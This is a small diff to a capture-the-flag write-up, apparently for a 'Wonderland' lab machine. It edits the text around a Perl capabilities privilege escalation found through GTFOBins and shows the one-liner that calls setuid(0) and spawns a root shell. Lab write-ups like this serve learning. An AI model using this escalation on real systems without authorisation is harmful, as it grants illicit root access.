@@ -232,7 +232,8 @@ Files with capabilities:
 ```
 
 
-* > Using [gftobins](https://gtfobins.github.io/gtfobins/perl/) i could find a exploit that would grant me root using perl. I ran the Capabilities exploit.
+* > Using [gftobins](https://gtfobins.github.io/gtfobins/perl/) i could find a exploit that would grant me root using perl. I ran the Capabilities exploit:
+  >
 
 ```bash
 hatter@wonderland:/home/alice$/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
